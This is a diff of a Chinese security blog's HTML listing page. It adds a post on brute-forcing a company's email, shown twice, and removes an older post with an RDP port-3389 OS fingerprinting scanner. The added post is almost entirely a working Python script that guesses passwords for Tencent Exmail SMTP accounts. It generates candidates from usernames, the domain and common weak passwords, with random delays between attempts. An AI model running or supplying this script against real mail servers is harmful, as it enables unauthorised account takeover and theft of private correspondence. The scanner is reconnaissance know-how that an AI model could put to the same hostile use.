@@ -117,6 +117,150 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/05/19/baopo-Q.html" >某企业邮箱爆破</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-05-19  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+# coding: utf-8
+
+import smtplib
+import random
+import time
+import sys
+
+
+def tencent(user, password):
+	time.sleep(random.uniform(2, 6))
+	smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;
+	smtp_port &#x3D; 587
+	server &#x3D; smtplib.SMTP(smtp_server, smtp_port)
+	server.starttls()
+	try:
+		server.login(user, password)
+		print &#39;[+]----------auth success------%s&#39; % password
+	except smtplib.SMTPAuthenticationError as e:
+		print &#39;[+] Auth Fail %s: %s&#39; % (user, password)
+
+
+def genpasswd(user, suffix):
+	domain &#x3D; suffix.split(&#39;.&#39;)[0]
+	password &#x3D; []
+	password.append(domain + &#39;@123&#39;)
+	password.append(domain + &#39;@1234&#39;)
+	name &#x3D; user.split(&#39;@&#39;)[0]
+	wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]
+	password.extend(wake_value)
+	return password
+
+
+def genusers(userfiles, suffix):
+	users &#x3D; []
+	with open(userfiles, &#39;rb&#39;) as f:
+		while 1:
+			user &#x3D; f.readline().strip()
+			if user &#x3D;&#x3D; &#39;&#39;:
+				break
+			users.append(user + &#39;@&#39; + suffix)
+		return users
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+	if len(sys.argv) !&#x3D; 3:
+		print &#39;Usage: %s userfile domain&#39; % sys.argv[0]
+		print &#39;%s users.txt baidu.com&#39; % sys.argv[0]
+		exit(0)
+	userfile &#x3D; sys.argv[1]
+	suffix &#x3D; sys.argv[2]
+	for user in genusers(userfile, suffix):
+		for password in genpasswd(user, suffix):
+			tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/05/19/baopo-Q.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+# coding: utf-8
+
+import smtplib
+import random
+import time
+import sys
+
+
+def tencent(user, password):
+	time.sleep(random.uniform(2, 6))
+	smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;
+	smtp_port &#x3D; 587
+	server &#x3D; smtplib.SMTP(smtp_server, smtp_port)
+	server.starttls()
+	try:
+		server.login(user, password)
+		print &#39;[+]----------auth success------%s&#39; % password
+	except smtplib.SMTPAuthenticationError as e:
+		print &#39;[+] Auth Fail %s: %s&#39; % (user, password)
+
+
+def genpasswd(user, suffix):
+	domain &#x3D; suffix.split(&#39;.&#39;)[0]
+	password &#x3D; []
+	password.append(domain + &#39;@123&#39;)
+	password.append(domain + &#39;@1234&#39;)
+	name &#x3D; user.split(&#39;@&#39;)[0]
+	wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]
+	password.extend(wake_value)
+	return password
+
+
+def genusers(userfiles, suffix):
+	users &#x3D; []
+	with open(userfiles, &#39;rb&#39;) as f:
+		while 1:
+			user &#x3D; f.readline().strip()
+			if user &#x3D;&#x3D; &#39;&#39;:
+				break
+			users.append(user + &#39;@&#39; + suffix)
+		return users
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+	if len(sys.argv) !&#x3D; 3:
+		print &#39;Usage: %s userfile domain&#39; % sys.argv[0]
+		print &#39;%s users.txt baidu.com&#39; % sys.argv[0]
+		exit(0)
+	userfile &#x3D; sys.argv[1]
+	suffix &#x3D; sys.argv[2]
+	for user in genusers(userfile, suffix):
+		for password in genpasswd(user, suffix):
+			tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/05/19/baopo-Q.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/04/12/xss-encode2.html" >XSS编码</a>
 		</h3>
 		</div>
@@ -503,214 +647,6 @@ http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/02/28/3389-scan.html" >3389指纹扫描</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-02-28  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
-<ul>
-<li>TCP三次握手</li>
-<li>客户端发送COTP协议</li>
-<li>服务端发送TPKT</li>
-</ul>
-<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
-<p>最后的python脚本是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
-# coding: utf-8
-
-import socket
-import binascii
-import sys
-import threading
-from Queue import Queue
-
-
-def verify(sock, port):
-	while 1:
-		buff &#x3D; sock.recv(2048)
-		if not buff:
-			break
-		b &#x3D; bytearray(buff)
-		print &quot;[+] %s&quot; % binascii.hexlify(b)
-		detect_os(binascii.hexlify(b), port)
-		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
-		# 	print &quot;[+] RDP Port is %s&quot; % port
-		# 	sys.exit(0)
-
-
-def detect_os(res, port):
-	d &#x3D; &#123;
-		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
-		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
-		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
-		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
-		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
-		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
-	&#125;
-	for key, value in d.iteritems():
-		if value &#x3D;&#x3D; res:
-			print &quot;[+] Os May be: %s&quot; % key
-			print &quot;[+] RDP Port is %s&quot; % port
-			sys.exit(0)
-def send_payload(sock):
-	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
-
-
-def worker():
-	while not q.empty():
-		port &#x3D; q.get()
-		try:
-			scan(port)
-		finally:
-			q.task_done()
-
-
-def scan(port):
-	try:
-		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.settimeout(2)
-		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
-		sys.stdout.flush()
-		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
-			print &quot;[+] Connect Success %s&quot; % port
-			send_payload(s)
-			verify(s, port)
-	except Exception, e:
-		# raise e
-		pass
-	s.close()
-
-if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
-	if len(sys.argv) !&#x3D; 2:
-		print &quot;Usage: %s IP&quot; % sys.argv[0]
-		sys.exit(0)
-	ip &#x3D; sys.argv[1]
-	q &#x3D; Queue()
-	map(q.put, xrange(3300, 65535))
-	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
-	map(lambda x: x.start(), threads)
-	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-	
-
-	</div>
-  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
-<ul>
-<li>TCP三次握手</li>
-<li>客户端发送COTP协议</li>
-<li>服务端发送TPKT</li>
-</ul>
-<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
-<p>最后的python脚本是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
-# coding: utf-8
-
-import socket
-import binascii
-import sys
-import threading
-from Queue import Queue
-
-
-def verify(sock, port):
-	while 1:
-		buff &#x3D; sock.recv(2048)
-		if not buff:
-			break
-		b &#x3D; bytearray(buff)
-		print &quot;[+] %s&quot; % binascii.hexlify(b)
-		detect_os(binascii.hexlify(b), port)
-		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
-		# 	print &quot;[+] RDP Port is %s&quot; % port
-		# 	sys.exit(0)
-
-
-def detect_os(res, port):
-	d &#x3D; &#123;
-		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
-		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
-		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
-		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
-		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
-		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
-	&#125;
-	for key, value in d.iteritems():
-		if value &#x3D;&#x3D; res:
-			print &quot;[+] Os May be: %s&quot; % key
-			print &quot;[+] RDP Port is %s&quot; % port
-			sys.exit(0)
-def send_payload(sock):
-	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
-
-
-def worker():
-	while not q.empty():
-		port &#x3D; q.get()
-		try:
-			scan(port)
-		finally:
-			q.task_done()
-
-
-def scan(port):
-	try:
-		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.settimeout(2)
-		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
-		sys.stdout.flush()
-		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
-			print &quot;[+] Connect Success %s&quot; % port
-			send_payload(s)
-			verify(s, port)
-	except Exception, e:
-		# raise e
-		pass
-	s.close()
-
-if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
-	if len(sys.argv) !&#x3D; 2:
-		print &quot;Usage: %s IP&quot; % sys.argv[0]
-		sys.exit(0)
-	ip &#x3D; sys.argv[1]
-	q &#x3D; Queue()
-	map(q.put, xrange(3300, 65535))
-	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
-	map(lambda x: x.start(), threads)
-	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-	
-	</div>
-  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -766,7 +702,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -787,6 +723,10 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
       </li>
     
@@ -800,10 +740,6 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
     
       <li>
         <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
       </li>
     
   </ul>
